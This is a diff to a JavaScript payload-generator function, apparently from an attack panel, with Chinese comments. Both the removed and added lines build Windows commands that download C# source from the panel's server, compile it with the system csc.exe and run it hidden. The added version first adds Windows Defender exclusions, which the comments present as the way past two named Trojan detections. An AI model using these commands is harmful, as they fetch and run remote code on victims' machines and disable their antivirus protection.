@@ -565,12 +565,7 @@ function genPayload(){
         '</pre>';
     }else{
       html+='<pre class="dt-code" style="margin:0">'+
-        ':: 方式1: PowerShell 下载运行（自动定位系统自带 csc.exe，无需 PATH）\n'+
-        'powershell -w hidden -c \"IWR -Uri \''+location.origin+'/'+dl+'\' -OutFile $env:TEMP\\j.cs; '+
-        '$csc=$env:WINDIR+\'\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\'; if(!(Test-Path $csc)){$csc=\'csc\'}; '+
-        '& $csc /nologo /target:winexe /out:$env:TEMP\\j.exe $env:TEMP\\j.cs; Start-Process $env:TEMP\\j.exe\"\n\n'+
-        ':: 方式2: certutil 下载（cmd 窗口）\n'+
-        'certutil -urlcache -split -f '+location.origin+'/'+dl+' %TEMP%\\j.cs && %WINDIR%\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /nologo /target:winexe /out:%TEMP%\\j.exe %TEMP%\\j.cs && %TEMP%\\j.exe'+
+        ':: ★ 端点防护：Windows Defender 默认开启，会两步拦住投递\n::   ① 按【编译产物】判毒 Trojan:MSIL/Lazy.BAC!MTB —— 在【进程创建阶段】直接拦掉，\n::      报 \"file contains a virus\"，现象就是\"运行后直接退出、什么都没发生\"；\n::   ② 按【投递命令行】另有签名 Trojan:Win32/PowExcEnv.ZA!MTB —— 会把整条进程树清算。\n::   因此必须【先放行两个目标路径，再下载 → 编译 → 运行】。顺序反了（先编译后放行）\n::   没用：exe 一诞生就被实时扫描判定，事后放行救不回来。\n::\n:: 步1 放行（需管理员；非管理员会失败，只能先手动关实时保护）\npowershell -c \"Add-MpPreference -ExclusionPath ([IO.Path]::GetTempPath()+\'j.cs\'),([IO.Path]::GetTempPath()+\'j.exe\') -EA SilentlyContinue\"\n:: 步2 下载源码\npowershell -c \"IWR -Uri \''+location.origin+'/'+dl+'\' -OutFile ([IO.Path]::GetTempPath()+\'j.cs\') -UseBasicParsing\"\n:: 步3 编译（系统自带 csc.exe，无需 PATH）\n%WINDIR%\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /nologo /target:winexe /out:%TEMP%\\j.exe %TEMP%\\j.cs\n:: 步4 运行\n%TEMP%\\j.exe'+
         '</pre>';
     }
     html+='</div></div>';
